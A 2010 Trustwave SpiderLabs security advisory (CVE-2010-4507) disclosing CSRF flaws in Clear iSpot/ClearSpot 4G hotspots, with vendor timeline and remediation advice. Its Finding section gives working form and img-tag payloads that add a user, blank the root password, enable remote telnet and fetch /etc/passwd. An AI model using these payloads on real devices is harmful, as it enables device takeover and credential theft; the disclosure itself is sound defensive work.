@@ -1,0 +1,195 @@
+Trustwave's SpiderLabs Security Advisory TWSL2010-008:
+Clear iSpot/Clearspot CSRF Vulnerabilities
+
+https://www.trustwave.com/spiderlabs/advisories/TWSL2010-008.txt
+
+Published: 2010-12-10 Version: 1.0
+
+Vendor: Clear (http://www.clear.com <http://www.clear.com/>)
+Products: iSpot / ClearSpot 4G (http://www.clear.com/devices)
+Versions affected:
+The observed behavior the result of a design choice, and may be present
+on multiple versions. The specific versions used during testing are
+given below.
+
+iSpot version:           2.0.0.0 [R1679 (Jul 6 2010 17:57:37)]
+Clearspot versions:      2.0.0.0 [R1512 (May 31 2010 18:57:09)]
+                         2.0.0.0 [R1786 (Aug 4 2010 20:09:06)]
+Firmware Version :       1.9.9.4
+Hardware Version :       R051.2
+Device Name :            IMW-C615W
+Device Manufacturer :    INFOMARK (http://infomark.co.kr
+<http://infomark.co.kr/>)
+
+Product Description:
+iSpot and ClearSpot 4G are portable 4G devices, that allow users to share
+and broadcast their own personal WiFi network. The device connects up to 8
+clients at the same time, on the same 4G connection.
+
+Credit: Matthew Jakubowski of Trustwave's SpiderLabs
+
+CVE: CVE-2010-4507
+
+Finding:
+These devices are susceptible to Cross-Site Request Forgery (CSRF).
+An attacker that is able to coerce a ClearSpot / iSpot user into
+following a link can arbitrarily execute system commands on the device.
+
+The following examples will allow an attacker to enable remote access to
+the
+iSpot and ClearSpot 4G, and add their own account to the device. This level
+of access also provides a device's client-side SSL certificates, which are
+used to perform device authentication. This could lead to a compromise of
+ClearWire accounts as well as other personal information.
+
+Add new user:
+<form method="post" action="http://server/cgi-bin/webmain.cgi";
+<http://192.168.1.1/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_cmd_result">
+<input type="hidden" name="cmd" value="adduser -S jaku">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://server/cgi-bin/webmain.cgi?act=act_cmd_result&cmd=adduser%
+20-S%20jaku'>
+
+Remove root password:
+<form method="post" action="http://server/cgi-bin/webmain.cgi";
+<http://192.168.1.1/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_cmd_result">
+<input type="hidden" name="cmd" value="passwd -d root">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://server/cgi-bin/webmain.cgi?act=act_cmd_result&cmd=passwd%2
+0-d%20root'>
+
+Enable remote administration access:
+<form method="post" action="http://server/cgi-bin/webmain.cgi";
+<http://server/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_network_set">
+<input type="hidden" name="enable_remote_access" value="YES">
+<input type="hidden" name="remote_access_port" value="80">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://server/cgi-bin/webmain.cgi?act=act_network_set&enable_remo
+te_access=YES&remote_access_port=80'>
+
+Enable telnet if not already enabled:
+
+<form method="post" action="http://server/cgi-bin/webmain.cgi";
+<http://server/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_set_wimax_etc_config">
+<input type="hidden" name="ENABLE_TELNET" value="YES">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://server/cgi-bin/webmain.cgi?act=act_set_wimax_etc_config&EN
+ABLE_TELNET=YES'>
+
+Allow remote telnet access:
+<form method="post" action="http://server/cgi-bin/webmain.cgi";
+<http://server/cgi-bin/webmain.cgi%22>>
+<input type="hidden" name="act" value="act_network_set">
+<input type="hidden" name="add_enable" value="YES">
+<input type="hidden" name="add_host_ip" value="1">
+<input type="hidden" name="add_port" value="23">
+<input type="hidden" name="add_protocol" value="BOTH">
+<input type="hidden" name="add_memo" value="admintelnet">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://server/cgi-bin/webmain.cgi?act=act_network_set&add_enable=
+YES&add_host_ip=1&add_port=23&add_protocol=both&add_memo=admintelnet'>
+
+Once compromised, it is possible to download any file from the devices
+using
+the following method.
+
+Download /etc/passwd file:
+<form method="post" action="http://server/cgi-bin/upgrademain.cgi
+<http://server/cgi-bin/upgrademain.cgi> ">
+<input type="hidden" name="act" value="act_file_download">
+<input type="hidden" name="METHOD" value="PATH">
+<input type="hidden" name="FILE_PATH" value="/etc/passwd">
+<input type="submit">
+</form>
+
+or
+
+<img
+src='http://server/cgi-bin/upgrademain.cgi?act=act_file_download&METHO
+D=PATH&FILE_PATH=/etc/passwd'>
+
+Vendor Response:
+No official response is available at the time of release.
+
+Remediation Steps:
+No patch currently exists for this issue. To limit exposure,
+network access to these devices should be limited to authorized
+personnel through the use of Access Control Lists and proper
+network segmentation.
+
+Vendor Communication Timeline:
+8/26/10 - Vendor contact initiated.
+9/30/10 - Vulnerability details provided to vendor.
+12/3/10 - Notified vendor of release date. No workaround or patch provided.
+12/10/10 - Advisory published.
+
+Revision History:
+1.0 Initial publication
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit
+
+https://www.trustwave.com <https://www.trustwave.com/>
+
+About Trustwave's SpiderLabs:
+SpiderLabs is the advance security team at Trustwave responsible for
+incident response and forensics, ethical hacking and application security
+tests for Trustwave's clients. SpiderLabs has responded to hundreds of
+security incidents, performed thousands of ethical hacking exercises and
+tested the security of hundreds of business applications for Fortune 500
+organizations.  For more information visit
+https://www.trustwave.com/spiderlabs
+
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
